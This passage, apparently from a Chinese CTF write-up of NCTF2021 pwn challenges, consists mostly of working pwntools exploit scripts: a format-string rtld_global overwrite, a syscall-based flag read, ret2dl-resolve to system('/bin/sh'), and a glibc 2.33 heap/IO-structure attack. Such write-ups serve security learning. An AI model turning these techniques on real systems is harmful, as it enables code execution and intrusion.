class="hljs-string">&#x27;\n&#x27;</span>),<span class="hljs-number">16</span>)-<span class="hljs-number">0x18b0</span><br>one_gadget=libc.address+<span class="hljs-number">0xe3b2e</span><br>ld.address=libc.address+<span class="hljs-number">0x1f4000</span><br>_rtld_global=ld.sym[<span class="hljs-string">&#x27;_rtld_global&#x27;</span>]<br>_rtld_lock=_rtld_global+<span class="hljs-number">0xf08</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc.address),<span class="hljs-built_in">hex</span>(e.address))<br>fmt(<span class="hljs-string">&quot;%13$p\n%41$p&quot;</span>)<br>_13=<span class="hljs-built_in">int</span>(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>),<span class="hljs-number">16</span>)<br>_41=<span class="hljs-built_in">int</span>(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>),<span class="hljs-number">16</span>)&amp;<span class="hljs-number">0xfffffffffffffff0</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(_13),<span class="hljs-built_in">hex</span>(_41))<br>ext=e.got[<span class="hljs-string">&#x27;exit&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(ext))<br>f=bssfmt(fmt)<br>f.fmt_edit(p64(_rtld_lock),<span class="hljs-number">13</span>,<span class="hljs-number">41</span>,_41,<span class="hljs-number">2</span>)<br>off=<span class="hljs-number">41</span>+((_41-_13)//<span class="hljs-number">8</span>)<br><span class="hljs-built_in">print</span>(off)<br>f.fmt_edit(p64(one_gadget),<span class="hljs-number">41</span>,off,_rtld_lock,<span class="hljs-number">1</span>)<br>  <span class="hljs-comment"># 通过修改 rtld_lock_default_lock_recursive 获取shell</span><br>p.sendline(<span class="hljs-string">&#x27;exit\n\x00&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="vmstack">vmstack</h2><p><img src="/img/blog_img/NCTF2021/NCTF2021-pwn-vmstack.jpg" srcset="/img/loading.gif" lazyload alt="程序主要代码" title="程序主要代码"></p><p>这个程序相当于一个代码解析器，程序中可以控制<code>rax</code>,<code>rdi</code>,<code>rsi</code>,<code>rdx</code>寄存器的值，刚好是执行系统调用时需要用到的寄存器，而且程序中也可以执行系统调用，不过禁用了<code>execve</code>，所以我们无法通过执行<code>execve(&quot;/bin/sh&quot;)</code>获取<code>shell</code>，只能通过<code>orw</code>的形式获取<code>flag</code>，程序存在一个单独的栈空间，所以我们无法通过栈获取程序中可以修改的空间，那么我们就需要通过brk系统调用获取空间地址，然后向空间中写入要读取的文件的名称，然后通过<code>orw</code>获取文件内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>e=ELF(<span class="hljs-string">&#x27;vmstack&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>e.address=<span class="hljs-number">0x555555554000</span><br>bss=e.bss(<span class="hljs-number">0x200</span>)<br>rdi=<span class="hljs-string">&#x27;rdi&#x27;</span><br>rsi=<span class="hljs-string">&#x27;rsi&#x27;</span><br>rax=<span class="hljs-string">&#x27;rax&#x27;</span><br>rdx=<span class="hljs-string">&#x27;rdx&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pop</span>(<span class="hljs-params">reg</span>):<br>    regs=[<span class="hljs-string">&#x27;rax&#x27;</span>,<span class="hljs-string">&#x27;rdi&#x27;</span>,<span class="hljs-string">&#x27;rsi&#x27;</span>,<span class="hljs-string">&#x27;rdx&#x27;</span>]<br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">5</span>+regs.index(reg)+<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">push</span>(<span class="hljs-params">reg</span>):<br>    regs=[<span class="hljs-string">&#x27;rax&#x27;</span>,<span class="hljs-string">&#x27;rdi&#x27;</span>,<span class="hljs-string">&#x27;rsi&#x27;</span>,<span class="hljs-string">&#x27;rdx&#x27;</span>]<br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">1</span>+regs.index(reg))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x0a&#x27;</span>+p64(data)<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sub</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x0b&#x27;</span>+p64(data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mov</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x00&#x27;</span>+p64(data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sys</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x0c&#x27;</span><br><br>p=remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">4444</span>)<br><br>shellcode=mov(<span class="hljs-number">0xc</span>)+pop(rax)+mov(<span class="hljs-number">0x1000</span>)+pop(rdi)+sys()<br> <span class="hljs-comment"># 通过 系统调用 brk 从系统中获取空间</span><br> <span class="hljs-comment"># 这样就可以获取 可以读写的空间地址了</span><br>shellcode+=push(rax)+sub(<span class="hljs-number">0x400</span>)<br>shellcode+=push(rax)+sub(<span class="hljs-number">0x400</span>)<br>shellcode+=push(rax)+sub(<span class="hljs-number">0x400</span>)<br>shellcode+=push(rax)+sub(<span class="hljs-number">0x400</span>)<br>shellcode+=pop(rsi)+mov(<span class="hljs-number">0</span>)+pop(rdi)+mov(<span class="hljs-number">4</span>)+pop(rdx)+mov(<span class="hljs-number">0</span>)+pop(rax)+sys()<br>shellcode+=pop(rdi)+mov(<span class="hljs-number">0</span>)+pop(rsi)+mov(<span class="hljs-number">0</span>)+pop(rdx)+mov(<span class="hljs-number">2</span>)+pop(rax)+sys()<br>shellcode+=pop(rsi)+mov(<span class="hljs-number">4</span>)+pop(rdi)+mov(<span class="hljs-number">0x40</span>)+pop(rdx)+mov(<span class="hljs-number">0</span>)+pop(rax)+sys()<br>shellcode+=pop(rsi)+mov(<span class="hljs-number">1</span>)+pop(rdi)+mov(<span class="hljs-number">0x40</span>)+pop(rdx)+mov(<span class="hljs-number">1</span>)+pop(rax)+sys()<br> <span class="hljs-comment"># 利用 ORW 获取flag</span><br>p.sendline(shellcode)<br>p.sendline(<span class="hljs-string">&#x27;flag&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="login">login</h2><p><img src="/img/blog_img/NCTF2021/NCTF2021-pwn-login.jpg" srcset="/img/loading.gif" lazyload alt="main函数代码" title="main函数代码"></p><p><img src="/img/blog_img/NCTF2021/NCTF2021-pwn-login-1.jpg" srcset="/img/loading.gif" lazyload alt="dynamic段内容" title="dynamic段内容"></p><p>程序关闭了输出流，只能输入，那么只能使用<code>ret2dl</code>来做</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>e=ELF(<span class="hljs-string">&#x27;login&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>edit=<span class="hljs-number">0x4011ed</span><br>leave=<span class="hljs-number">0x40121f</span><br>rdi=<span class="hljs-number">0x401293</span><br>close=e.got[<span class="hljs-string">&#x27;close&#x27;</span>]<br>bss=e.bss(<span class="hljs-number">0xf88</span>)<br>rel=<span class="hljs-number">0x4005d0</span><br>sym=<span class="hljs-number">0x3ff418</span><br>relstr=<span class="hljs-number">0x3ff388</span><br><br>p=remote(<span class="hljs-string">&#x27;127.0.0.1:4444&#x27;</span>)<br>p.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x100</span>+p64(bss)+p64(edit))<br>bss=bss-<span class="hljs-number">0x100</span>+<span class="hljs-number">0x50</span><br>n=<span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> ((n+bss+<span class="hljs-number">0x30</span>-rel)//<span class="hljs-number">0x18</span>) != (n+<span class="hljs-number">0x30</span>+bss-rel)*<span class="hljs-number">1.0</span>/<span class="hljs-number">0x18</span>:<br>    n=n+<span class="hljs-number">8</span><br><span class="hljs-comment"># 计算偏移</span><br><br>fake_dnystr=p64(<span class="hljs-number">0</span>)*(n//<span class="hljs-number">8</span>)+<span class="hljs-string">&#x27;system\x00\x00&#x27;</span> <span class="hljs-comment"># bss+0x50</span><br>f_str=bss+n+<span class="hljs-number">0x28</span><br>fake_rel=p64(close)+ p32(<span class="hljs-number">0x7</span>) + p32((f_str+<span class="hljs-number">0x38</span>-sym)//<span class="hljs-number">0x18</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>fake_sym=p32(f_str-relstr)+p32(<span class="hljs-number">0x12</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)  <span class="hljs-comment"># bss+0x60</span><br>fake=fake_dnystr+fake_rel+fake_sym<br><span class="hljs-comment"># 构造虚假的表</span><br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x48</span>+<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>+p64(rdi)+p64(bss+<span class="hljs-number">0x48</span>+<span class="hljs-number">0x60</span>)+p64(<span class="hljs-number">0x401020</span>)<br>payload+=p64((f_str+<span class="hljs-number">0x8</span>-rel)//<span class="hljs-number">0x18</span>) <br>payload+=p64(<span class="hljs-number">0x401196</span>) <br>payload+=fake.ljust(<span class="hljs-number">0xb0</span>-<span class="hljs-number">0x30</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)+<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span><br>payload+=p64(bss-<span class="hljs-number">8</span>)+p64(leave)<br><span class="hljs-comment"># 构造payload 通过 _dl_runtime_resolve 执行system(&quot;/bin/sh&quot;);</span><br>p.send(payload)<br>p.sendline(<span class="hljs-string">&#x27;exec 1&gt;&amp;0&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="house-of-fmyyass">house_of_fmyyass</h2><p><img src="/img/blog_img/NCTF2021/NCTF2021-pwn-house_of_fmyyass.jpg" srcset="/img/loading.gif" lazyload alt="main函数代码" title="main函数代码"></p><p><img src="/img/blog_img/NCTF2021/NCTF2021-pwn-house_of_fmyyass-1.jpg" srcset="/img/loading.gif" lazyload alt="create函数代码" title="create函数代码"></p><p><img src="/img/blog_img/NCTF2021/NCTF2021-pwn-house_of_fmyyass-2.jpg" srcset="/img/loading.gif" lazyload alt="edit函数代码" title="edit函数代码"></p><p><img src="/img/blog_img/NCTF2021/NCTF2021-pwn-house_of_fmyyass-3.jpg" srcset="/img/loading.gif" lazyload alt="delete函数代码" title="delete函数代码"></p><p><img src="/img/blog_img/NCTF2021/NCTF2021-pwn-house_of_fmyyass-4.jpg" srcset="/img/loading.gif" lazyload alt="show函数代码" title="show函数代码"></p><p><img src="/img/blog_img/NCTF2021/NCTF2021-pwn-house_of_fmyyass-5.jpg" srcset="/img/loading.gif" lazyload alt="main_init函数代码" title="main_init函数代码"></p><p>函数在开始的时候使用<code>mmap</code>创建了一个空间，作为伪造的堆空间，<code>delete函数</code>可以释放伪造的<code>heap段</code>中的<code>chunk</code>，<code>edit</code>可以随意修改伪造的<code>heap段</code>中的数据，<code>create函数</code>通过<code>calloc函数</code>创建<code>chunk</code>，无法通过<code>tcache bin attach</code>修改任意地址，且每次调用都会刷新<code>buf</code>变量指向的地址，<code>show</code>可以获取<code>buf</code>当前指向的空间的数据</p><p>每次执行<code>menu函数</code>时都会检测<code>malloc_hook</code>与<code>free_hook</code>，所以想要利用这两个<code>hook</code>获取<code>flag</code>的可能性没有了，因为在程序中只能随意修改伪造的<code>heap</code>段中的数据，且程序中都是调用<code>_exit函数</code>，所以<code>exit_hook</code>也不能用，那只能通过<code>IO结构体</code>攻击，我是用<code>house_of_husk</code>和<code>house_of_cat</code>进行攻击的，先使用<code>house_of_husk</code>，修改<code>__printf_function_table</code>和<code>__printf_arginfo_table</code>为伪造的<code>heap段</code>中的数据，使<code>__printf_arginfo_table['s']</code>处储存<code>_IO_cleanup</code>函数地址，执行<code>_IO_flush_all_lockp</code>,遍历<code>IO_list_all</code>中的<code>IO结构体</code>，执行这些<code>IO结构体</code>中<code>vtable</code>指向的<code>overflow项</code>，然后再使用<code>house_of_cat</code>，需要先构造一个<code>fake_io</code>，在伪造的<code>heap</code>段中，且要让<code>IO_list_all</code>中储存<code>fake_io</code>的地址，上面所有要修改的变量，都可以使用<code>large bin attach</code>进行修改</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> time<br>libc=ELF(<span class="hljs-string">&#x27;libc-2.33.so&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>c_l=[]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,size,text,heap=<span class="hljs-number">0</span>,off=<span class="hljs-number">0</span></span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,ind):<br>        off+=c_l[i]<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&quot;size: &quot;</span>,<span class="hljs-built_in">str</span>(size))<br>    p.sendlineafter(<span class="hljs-string">&#x27;offset: &#x27;</span>,<span class="hljs-built_in">str</span>(off))<br>    p.sendlineafter(<span class="hljs-string">&#x27;content: &#x27;</span>,text)<br>    <span class="hljs-keyword">if</span> heap:<br>        c_l.append(size)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit1</span>(<span class="hljs-params">off,size,text</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&quot;size: &quot;</span>,<span class="hljs-built_in">str</span>(size))<br>    p.sendlineafter(<span class="hljs-string">&#x27;offset: &#x27;</span>,<span class="hljs-built_in">str</span>(off))<br>    p.sendlineafter(<span class="hljs-string">&#x27;content: &#x27;</span>,text)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    off=<span class="hljs-number">0x10</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,ind):<br>            off+=c_l[i]<br>    <span class="hljs-built_in">print</span>(c_l)<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;idx: &#x27;</span>,<span class="hljs-built_in">str</span>(off))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calc_mmap</span>(<span class="hljs-params">addr</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        因为在libc2.33中单向链表中的fd是被加密的</span><br><span class="hljs-string">        但只要知道fd要指向的chunk的低12位是什么</span><br><span class="hljs-string">        就可以解密得到整个chunk地址</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    h_a=<span class="hljs-built_in">hex</span>(addr)[<span class="hljs-number">2</span>:].strip(<span class="hljs-string">&#x27;L&#x27;</span>)<br>    real_add=h_a[:<span class="hljs-number">3</span>]<br>    h_a=h_a[<span class="hljs-number">3</span>:]<br>    e=[]<br>    h_c=[]<br>    h_a=h_a[::-<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(h_a),<span class="hljs-number">3</span>):<br>        h_c.append(h_a[i:i+<span class="hljs-number">3</span>][::-<span class="hljs-number">1</span>])<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> h_c:<br>        <span class="hljs-keyword">if</span> e==[]:<br>            e.append(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">int</span>(i,<span class="hljs-number">16</span>)^<span class="hljs-number">0x180</span>)[<span class="hljs-number">2</span>:])<br>        <span class="hljs-keyword">else</span>:<br>            l=<span class="hljs-built_in">len</span>(i)<br>            e.append(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">int</span>(e[-<span class="hljs-number">1</span>][<span class="hljs-number">3</span>-l:],<span class="hljs-number">16</span>)^<span class="hljs-built_in">int</span>(i,<span class="hljs-number">16</span>))[<span class="hljs-number">2</span>:])<br>    e=e[::-<span class="hljs-number">1</span>]<br>    real_add=<span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(e),<span class="hljs-number">16</span>)&lt;&lt;<span class="hljs-number">12</span><br>    <span class="hljs-keyword">return</span> real_add<br><br>p=process(<span class="hljs-string">&#x27;house_of_fmyyass&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x30</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x31</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">#30</span><br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">0x30</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x31</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">#30</span><br>edit(<span class="hljs-number">2</span>,<span class="hljs-number">0x30</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x31</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">#30</span><br>edit(<span class="hljs-number">3</span>,<span class="hljs-number">0x30</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x31</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">#30</span><br>edit(<span class="hljs-number">4</span>,<span class="hljs-number">0x30</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x31</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">#30</span><br>edit(<span class="hljs-number">5</span>,<span class="hljs-number">0x30</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x31</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">#30</span><br>edit(<span class="hljs-number">6</span>,<span class="hljs-number">0x30</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x31</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">#30</span><br>edit(<span class="hljs-number">7</span>,<span class="hljs-number">0x30</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x31</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">#30</span><br>edit(<span class="hljs-number">8</span>,<span class="hljs-number">0x30</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x31</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">#30</span><br>edit(<span class="hljs-number">9</span>,<span class="hljs-number">0x30</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x31</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">#30</span><br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">3</span>)<br>free(<span class="hljs-number">4</span>)<br>free(<span class="hljs-number">5</span>)<br>free(<span class="hljs-number">6</span>) <span class="hljs-comment"># 将tcache bin填满</span><br><br>free(<span class="hljs-number">7</span>)<br>add(<span class="hljs-number">0x28</span>)<br>free(<span class="hljs-number">8</span>)<br>free(<span class="hljs-number">7</span>)<br><br>c_l=c_l[:-<span class="hljs-number">3</span>]<br>show()<br>p.readuntil(<span class="hljs-string">&#x27;content: &#x27;</span>)<br>d=u64(p.readuntil(<span class="hljs-string">&#x27;1. alloc&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>fake_heap=calc_mmap(d)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(fake_heap)) <span class="hljs-comment"># 先获取fake heap空间地址</span><br>add(<span class="hljs-number">0x28</span>)<br>add(<span class="hljs-number">0x28</span>)<br>edit(<span class="hljs-number">7</span>,<span class="hljs-number">0x30</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x31</span>),<span class="hljs-number">1</span>)<br>edit(<span class="hljs-number">8</span>,<span class="hljs-number">0x30</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x31</span>),<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">7</span>)<br>add(<span class="hljs-number">0x28</span>)<br>c_l=c_l[:-<span class="hljs-number">2</span>]<br><br>edit(<span class="hljs-number">7</span>,<span class="hljs-number">0x430</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x431</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">5</span>+p64(<span class="hljs-number">0x31</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">5</span>+p64(<span class="hljs-number">0x31</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+p64(<span class="hljs-number">0x30</span>)+p64(<span class="hljs-number">0x31</span>),<span class="hljs-number">1</span>)<br>edit(<span class="hljs-number">8</span>,<span class="hljs-number">0x30</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x31</span>),<span class="hljs-number">1</span>)<br>edit(<span class="hljs-number">9</span>,<span class="hljs-number">0x30</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x31</span>),<span class="hljs-number">1</span>)<br><br>free(<span class="hljs-number">7</span>)<br>show() <br><br>p.read(<span class="hljs-number">9</span>)<br>main_arena=<span class="hljs-number">0</span><br><span class="hljs-comment">#context.log_level=&#x27;debug&#x27;</span><br>data=p.read(<span class="hljs-number">8</span>)<br>p.readuntil(<span class="hljs-string">&#x27;exit&#x27;</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;1. &#x27;</span> <span class="hljs-keyword">in</span> data:<br>    <span class="hljs-string">&quot;&quot;&quot; </span><br><span class="hljs-string">        